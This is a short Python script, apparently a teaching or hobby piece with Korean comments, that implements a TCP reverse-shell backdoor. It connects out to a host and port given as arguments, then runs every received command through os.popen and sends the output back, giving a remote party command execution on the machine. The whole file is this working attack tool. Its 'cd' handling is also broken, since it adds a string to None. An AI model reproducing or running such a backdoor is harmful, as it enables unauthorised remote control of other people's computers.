#인자가 필요하도록 셋팅 되었기 때문에 cmd에서 인자(게이트웨이, 연결포트)와 같이 실
import os, socket, sys
import subprocess

def usage(): #help 메세지
    print('''
tcp_reverse_backdoor.py <host> <port>
''')
    exit()

if len(sys.argv) < 3:   #명령 입력 오류 시 메세지 출력
    usage()

with socket.socket() as s:  #socket 객체 생성
    addr = (sys.argv[1], int(sys.argv[2]))
    s.connect(addr)         #클라이언트 역할
    s.send('''
###########################
# tcp_reverse_backdoor.py #
###########################
>> '''.encode())

    while True:     #cmd처럼 명령어 계속 수행
        data = s.recv(1024).decode().lower()    #1024비트 받아서 decode(실제),소문자로

        if "q" == data:  #종료 명령으로 'q'
            exit()
        else:
            if data.startswith("cd"):   #'cd' 로 시작시 디렉토리 변경
                result = os.chdir(data[3:].replace('\n','')) #'cd '
                
            else :
                result = os.popen(data).read()
            result = result + "\n>>"
            s.send(result.encode())
        
